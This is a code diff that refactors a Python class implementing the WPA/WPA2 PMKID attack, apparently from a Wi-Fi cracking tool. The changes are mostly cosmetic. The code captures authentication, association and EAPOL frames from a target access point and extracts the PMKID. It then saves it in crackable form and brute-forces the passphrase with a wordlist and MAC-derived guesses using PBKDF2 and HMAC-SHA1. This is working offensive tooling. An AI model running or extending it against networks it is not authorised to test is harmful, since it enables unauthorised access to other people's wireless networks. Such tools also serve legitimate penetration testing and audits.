@@ -72,8 +72,8 @@ class PMKID:
 			chars = src[c:c+length]
 			hex = ' '.join(["%02x" % ord(x) for x in chars])
 			if len(hex) > 24:
-				hex = "%s %s" % (hex[:24], hex[24:])
-			printable = ''.join(["%s" % FILTER[ord(x)] for x in chars])
+				hex = f"{hex[:24]} {hex[24:]}"
+			printable = ''.join([f"{FILTER[ord(x)]}" for x in chars])
 			lines.append("%08x:  %-*s  |%s|\n" % (c, length*3, hex, printable))
 		return ''.join(lines)
 
@@ -83,7 +83,7 @@ class PMKID:
 
 		try:
 			while isinstance(elts[count], Dot11Elt):
-				if elts[count].ID == 0 or elts[count].ID == 1 or elts[count].ID == 48 or elts[count].ID == 5 or elts[count].ID == 50 or elts[count].ID == 221:    #ESSID #Rates
+				if elts[count].ID in [0, 1, 48, 5, 50, 221]:    #ESSID #Rates
 					__data[ elts[count].ID ] = {'ID': elts[count].ID, 'len': elts[count].len, 'info': elts[count].info}
 				count += 1
 		except IndexError:
@@ -97,7 +97,7 @@ class PMKID:
 	def form_asso_layers(self, efields, _pkt):
 		_st_layer = _pkt
 		for fie, val in efields.items():
-			if fie == 0 or fie == 1 or fie == 5 or fie == 48 or fie ==50 or fie == 221:
+			if fie in [0, 1, 5, 48, 50, 221]:
 				_st_layer = _st_layer / Dot11Elt(ID=val['ID'], len=val['len'], info=val['info'])
 		return _st_layer
 
@@ -117,27 +117,29 @@ class PMKID:
 			self.__AUTH_STATUS = False
 
 	def get_auth_resp(self, pkt):
-		if pkt.haslayer(RadioTap):
-			if pkt.haslayer(Dot11Auth):
-				sn = pkt.getlayer(Dot11).addr2.replace(':', '')
-				rc = pkt.getlayer(Dot11).addr1.replace(':', '')
-				if rc == self.cl.replace(':', '') and sn == self.ap.replace(':', ''):
-					if self.verbose:
-						self.pull.info("Received %s (%s) %s<%s %s (%s) %s[Open Authentication]%s" % \
-											(self.cl.replace(':', '').upper(), self.pull.DARKCYAN+org(self.cl).org+self.pull.END, self.pull.RED, self.pull.END, self.ap.replace(':', '').upper(),\
-											self.pull.DARKCYAN+org(self.ap).org+self.pull.END, self.pull.YELLOW, self.pull.END))
-						self.pull.info("Authentication %s (%s) %s>%s %s (%s) %s[SuccessFull]%s" % \
-											(self.ap.replace(':', '').upper(), self.pull.DARKCYAN+org(self.ap).org+self.pull.END, self.pull.RED, self.pull.END, self.cl.replace(':', '').upper(),\
-											self.pull.DARKCYAN+org(self.cl).org+self.pull.END, self.pull.GREEN, self.pull.END))
-					else:
-						self.pull.info("Received %s %s<%s %s %s[Open Authentication]%s" % (self.cl.replace(':', '').upper(), self.pull.RED, self.pull.END,\
-													 self.ap.replace(':', '').upper(), self.pull.YELLOW, self.pull.END))
-						self.pull.info("Authentication %s %s>%s %s %s[SuccessFull]%s" % \
-											(self.ap.replace(':', '').upper(), self.pull.RED, self.pull.END, self.cl.replace(':', '').upper(),\
-											self.pull.GREEN, self.pull.END))
+		if not pkt.haslayer(RadioTap):
+			return
+		if pkt.haslayer(Dot11Auth):
+			sn = pkt.getlayer(Dot11).addr2.replace(':', '')
+			rc = pkt.getlayer(Dot11).addr1.replace(':', '')
+			if rc == self.cl.replace(':', '') and sn == self.ap.replace(':', ''):
+				if self.verbose:
+					self.pull.info(
+						f"Received {self.cl.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.cl).org + self.pull.END}) {self.pull.RED}<{self.pull.END} {self.ap.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) {self.pull.YELLOW}[Open Authentication]{self.pull.END}"
+					)
+					self.pull.info(
+						f"Authentication {self.ap.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) {self.pull.RED}>{self.pull.END} {self.cl.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.cl).org + self.pull.END}) {self.pull.GREEN}[SuccessFull]{self.pull.END}"
+					)
+				else:
+					self.pull.info(
+						f"Received {self.cl.replace(':', '').upper()} {self.pull.RED}<{self.pull.END} {self.ap.replace(':', '').upper()} {self.pull.YELLOW}[Open Authentication]{self.pull.END}"
+					)
+					self.pull.info(
+						f"Authentication {self.ap.replace(':', '').upper()} {self.pull.RED}>{self.pull.END} {self.cl.replace(':', '').upper()} {self.pull.GREEN}[SuccessFull]{self.pull.END}"
+					)
 
-					self.__AUTH_STEP = bool(1)
-					raise ValueError
+				self.__AUTH_STEP = bool(1)
+				raise ValueError
 
 	def dev_conn(self):
 		auth_catcher = threading.Thread(target=self.auth_sniffer, args=(self.iface,), name="Authentication Catcher")
@@ -165,41 +167,41 @@ class PMKID:
 			self.__ASSO_STATUS = True
 			sniff(iface=iface, prn=self.get_asso_resp)
 		except Exception as e:
-			if not e == "EAPOL":
+			if e != "EAPOL":
 				sys.exit(e)
 		finally:
 			self.__ASSO_STATUS = False
 
 	def get_asso_resp(self, pkt):
-		if pkt.haslayer(Dot11AssoResp):
-			if pkt.getlayer(Dot11AssoResp).status == 0:
-				sn = pkt.getlayer(Dot11).addr2.replace(':', '')
-				rc = pkt.getlayer(Dot11).addr1.replace(':', '')
-				if rc == self.cl.replace(':', '') and sn == self.ap.replace(':', ''):
-					if self.verbose:
-						self.pull.info("Received %s (%s) %s<%s %s (%s) %s[Association Response]%s" % \
-													(self.cl.replace(':', '').upper(), self.pull.DARKCYAN+org(self.cl).org+self.pull.END, self.pull.RED, self.pull.END, self.ap.replace(':', '').upper(),\
-														self.pull.DARKCYAN+org(self.ap).org+self.pull.END, self.pull.YELLOW, self.pull.END))
-					else:
-						self.pull.info("Received %s %s<%s %s %s[Association Response]%s" % (self.cl.replace(':', '').upper(), self.pull.RED, self.pull.END,\
-													 self.ap.replace(':', '').upper(), self.pull.YELLOW, self.pull.END))
+		if pkt.haslayer(Dot11AssoResp) and pkt.getlayer(Dot11AssoResp).status == 0:
+			sn = pkt.getlayer(Dot11).addr2.replace(':', '')
+			rc = pkt.getlayer(Dot11).addr1.replace(':', '')
+			if rc == self.cl.replace(':', '') and sn == self.ap.replace(':', ''):
+				if self.verbose:
+					self.pull.info(
+						f"Received {self.cl.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.cl).org + self.pull.END}) {self.pull.RED}<{self.pull.END} {self.ap.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) {self.pull.YELLOW}[Association Response]{self.pull.END}"
+					)
+				else:
+					self.pull.info(
+						f"Received {self.cl.replace(':', '').upper()} {self.pull.RED}<{self.pull.END} {self.ap.replace(':', '').upper()} {self.pull.YELLOW}[Association Response]{self.pull.END}"
+					)
 
-					if not self.__M_PLACED:
-						if self.verbose:
-							self.pull.info("Authentication %s (%s) %s>%s %s (%s) %s[SuccessFull]%s" % \
-											(self.ap.replace(':', '').upper(), self.pull.DARKCYAN+org(self.ap).org+self.pull.END, self.pull.RED, self.pull.END, self.cl.replace(':', '').upper(),\
-											self.pull.DARKCYAN+org(self.cl).org+self.pull.END, self.pull.GREEN, self.pull.END))
-							self.pull.info("EAPOL %s (%s) %s>%s %s (%s) %s[Waiting...]%s" % \
-											(self.ap.replace(':', '').upper(), self.pull.DARKCYAN+org(self.ap).org+self.pull.END, self.pull.RED, self.pull.END, self.cl.replace(':', '').upper(),\
-											self.pull.DARKCYAN+org(self.cl).org+self.pull.END, self.pull.PURPLE, self.pull.END))
-						else:
-							self.pull.info("Authentication %s %s>%s %s %s[SuccessFull]%s" % \
-											(self.ap.replace(':', '').upper(), self.pull.RED, self.pull.END, self.cl.replace(':', '').upper(),\
-											self.pull.GREEN, self.pull.END))
-							self.pull.info("EAPOL %s %s>%s %s %s[Waiting...]%s" % \
-											(self.ap.replace(':', '').upper(), self.pull.RED, self.pull.END, self.cl.replace(':', '').upper(),\
-											self.pull.PURPLE, self.pull.END))
-						self.__M_PLACED = bool(1)
+				if not self.__M_PLACED:
+					if self.verbose:
+						self.pull.info(
+							f"Authentication {self.ap.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) {self.pull.RED}>{self.pull.END} {self.cl.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.cl).org + self.pull.END}) {self.pull.GREEN}[SuccessFull]{self.pull.END}"
+						)
+						self.pull.info(
+							f"EAPOL {self.ap.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) {self.pull.RED}>{self.pull.END} {self.cl.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.cl).org + self.pull.END}) {self.pull.PURPLE}[Waiting...]{self.pull.END}"
+						)
+					else:
+						self.pull.info(
+							f"Authentication {self.ap.replace(':', '').upper()} {self.pull.RED}>{self.pull.END} {self.cl.replace(':', '').upper()} {self.pull.GREEN}[SuccessFull]{self.pull.END}"
+						)
+						self.pull.info(
+							f"EAPOL {self.ap.replace(':', '').upper()} {self.pull.RED}>{self.pull.END} {self.cl.replace(':', '').upper()} {self.pull.PURPLE}[Waiting...]{self.pull.END}"
+						)
+					self.__M_PLACED = bool(1)
 
 		if pkt.haslayer(EAPOL):
 			sn = pkt.getlayer(Dot11).addr2.replace(':', '')
@@ -210,17 +212,19 @@ class PMKID:
 			if sn == self.ap.replace(':', '') and nonce != fNONCE and mic == fMIC:
 				self.__ASSO_STEP = True
 				if self.verbose:
-					self.pull.info("EAPOL %s (%s) %s>%s %s (%s) %s[Initiated]%s" % (self.ap.replace(':', '').upper(), self.pull.DARKCYAN+org(self.ap).org+self.pull.END , self.pull.RED, self.pull.END,\
-																			self.cl.replace(':', '').upper(), \
-																			self.pull.DARKCYAN+org(self.cl).org+self.pull.END, self.pull.YELLOW, self.pull.END))
-					self.pull.up("EAPOL %s (%s) %s>%s %s (%s) %s[1 of 4]%s" % (self.ap.replace(':', '').upper(), self.pull.DARKCYAN+org(self.ap).org+self.pull.END,\
-															 self.pull.RED, self.pull.END, self.cl.replace(':', '').upper(),\
-															 self.pull.DARKCYAN+org(self.cl).org+self.pull.END, self.pull.GREEN, self.pull.END) )
+					self.pull.info(
+						f"EAPOL {self.ap.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) {self.pull.RED}>{self.pull.END} {self.cl.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.cl).org + self.pull.END}) {self.pull.YELLOW}[Initiated]{self.pull.END}"
+					)
+					self.pull.up(
+						f"EAPOL {self.ap.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) {self.pull.RED}>{self.pull.END} {self.cl.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.cl).org + self.pull.END}) {self.pull.GREEN}[1 of 4]{self.pull.END}"
+					)
 				else:
-					self.pull.info("EAPOL %s %s>%s %s %s[Initiated]%s" % (self.ap.replace(':', '').upper(), self.pull.RED, self.pull.END, self.cl.replace(':', '').upper(), \
-																			self.pull.YELLOW, self.pull.END))
-					self.pull.up("EAPOL %s %s>%s %s %s[1 of 4]%s" % (self.ap.replace(':', '').upper(), self.pull.RED, self.pull.END, self.cl.replace(':', '').upper(),\
-															 self.pull.BOLD+self.pull.GREEN, self.pull.END) )
+					self.pull.info(
+						f"EAPOL {self.ap.replace(':', '').upper()} {self.pull.RED}>{self.pull.END} {self.cl.replace(':', '').upper()} {self.pull.YELLOW}[Initiated]{self.pull.END}"
+					)
+					self.pull.up(
+						f"EAPOL {self.ap.replace(':', '').upper()} {self.pull.RED}>{self.pull.END} {self.cl.replace(':', '').upper()} {self.pull.BOLD + self.pull.GREEN}[1 of 4]{self.pull.END}"
+					)
 				self.__EAPOL = pkt
 				raise ValueError("EAPOL")
 
@@ -254,18 +258,17 @@ class PMKID:
 		return self.__ASSO_STEP
 
 	def comp_mac_passes(self, mac):
-		list__ = list()
-		list__.append(mac.replace(':', '').lower()[:8])
+		list__ = [mac.replace(':', '').lower()[:8]]
 		list__.append(mac.replace(':', '').upper()[:8])
 		list__.append(mac.replace(':', '').lower()[4:])
 		list__.append(mac.replace(':', '').upper()[4:])
 		if re.search(r"[0-9]$", mac.replace(':', '').lower()[:8], re.I):
-			for n in range(0, 10):
+			for n in range(10):
 				if n != int(re.search(r"[0-9]$", mac.replace(':', '').lower()[:8], re.I).group()):
 					list__.append(mac.replace(':', '').lower()[:8][:-1] + str(n))
 					list__.append(mac.replace(':', '').upper()[:8][:-1] + str(n))
 		if re.search(r"[0-9]$", mac.replace(':', '').lower()[4:], re.I):
-			for n in range(0, 10):
+			for n in range(10):
 				if n != int(re.search(r"[0-9]$", mac.replace(':', '').lower()[4:], re.I).group()):
 					list__.append(mac.replace(':', '').lower()[4:][:-1] + str(n))
 					list__.append(mac.replace(':', '').upper()[4:][:-1] + str(n))
@@ -273,37 +276,46 @@ class PMKID:
 
 	def printing_pass(self, p_pass, c_pass):
 		len_A, len_B = len(p_pass), len(c_pass)
-		if len_A != 0:
-			if len_A > len_B:
-				return c_pass + ( " "*(len_A - len_B) )
-			else:
-				return c_pass
+		if len_A != 0 and len_A > len_B:
+			return c_pass + ( " "*(len_A - len_B) )
 		else:
 			return c_pass
 
 	def save(self, _write, PMKID):
 		if bool(_write):
-			_file = open(_write, 'w')
-			_file.write( str(PMKID) +"*"+ str(self.ap.replace(':', '')).lower() +"*"+ str(self.cl.replace(':', '')).lower() +"*"+ str(binascii.hexlify(self.essid)) +"\n" )
-			_file.close()
-			self.pull.use('PMKID -> %s[%s]%s %s[Saved]%s' % (self.pull.RED, _write, self.pull.END, self.pull.GREEN, self.pull.END))
+			with open(_write, 'w') as _file:
+				_file.write(
+					f"{str(PMKID)}*"
+					+ str(self.ap.replace(':', '')).lower()
+					+ "*"
+					+ str(self.cl.replace(':', '')).lower()
+					+ "*"
+					+ str(binascii.hexlify(self.essid))
+					+ "\n"
+				)
+			self.pull.use(
+				f'PMKID -> {self.pull.RED}[{_write}]{self.pull.END} {self.pull.GREEN}[Saved]{self.pull.END}'
+			)
 		else:
 			self.pull.error("PMKID not saved. Provide -w, --write option to save the capture. ")
 
 	def crack(self, _write):
 		fPMKID = '00000000000000000000000000000000'
 		PMKID = binascii.hexlify(self.__EAPOL.getlayer(Raw).load)[202:234]
-		if PMKID != fPMKID and PMKID != '':
+		if PMKID not in [fPMKID, '']:
 			self.pull.special("Vulnerable to PMKID Attack!")
 			if self.verbose:
-				self.pull.up("PMKID %s (%s) [%s]" % (self.ap.replace(':', '').upper(), self.pull.DARKCYAN+org(self.ap).org+self.pull.END, self.pull.RED+PMKID+self.pull.END))
+				self.pull.up(
+					f"PMKID {self.ap.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) [{self.pull.RED + PMKID + self.pull.END}]"
+				)
 			else:
-				self.pull.up("PMKID %s [%s]" % (self.ap.replace(':', '').upper(), self.pull.RED+PMKID+self.pull.END))
+				self.pull.up(
+					f"PMKID {self.ap.replace(':', '').upper()} [{self.pull.RED + PMKID + self.pull.END}]"
+				)
 
 			self.save(_write, PMKID)
 
-			_pmk = self.crack_the_pmk(PMKID)
-			return _pmk
+			return self.crack_the_pmk(PMKID)
 		else:
 			self.pull.error("The target AP doesn't contain PMKID field. Not Vulnerable. Try with handshake. ")
 			sys.exit(0)
@@ -312,25 +324,22 @@ class PMKID:
 		if type(self.passwords) == str:
 			_pass_list = self.passwords.split(',')
 		else:
-			_file = open(self.dict, 'r')
-			_pass_list = self.d_passes+_file.read().splitlines()
-			_file.close()
-
+			with open(self.dict, 'r') as _file:
+				_pass_list = self.d_passes+_file.read().splitlines()
 		_last_pass = ''
 
+		_pmk_fs = "PMK Name"
 		for _pass in _pass_list:
 			self.pull.up("Currently Checking: %s%s%s" % (self.pull.BOLD, self.printing_pass(_last_pass, _pass.rstrip('\n')), self.pull.END))
 			_last_pass = _pass.rstrip('\n')
 			_pmk = PBKDF2(_pass, self.essid, 4096).read(32)
 			_ap = binascii.a2b_hex(self.ap.replace(':', '').lower())
 			_cl = binascii.a2b_hex(self.cl.replace(':', '').lower())
-			_pmk_fs = "PMK Name"
 			_hash_ = hmac.new(_pmk, _pmk_fs+_ap+_cl, hashlib.sha1).hexdigest()[:32]
 			if _hash == _hash_:
 				return (_pass, self.hexdump(_pmk), self.hexdump(_hash_))
-			else:
-				if _pass != _pass_list[-1]:
-					self.pull.lineup()
+			if _pass != _pass_list[-1]:
+				self.pull.lineup()
 
 		return (None, '', '')
 
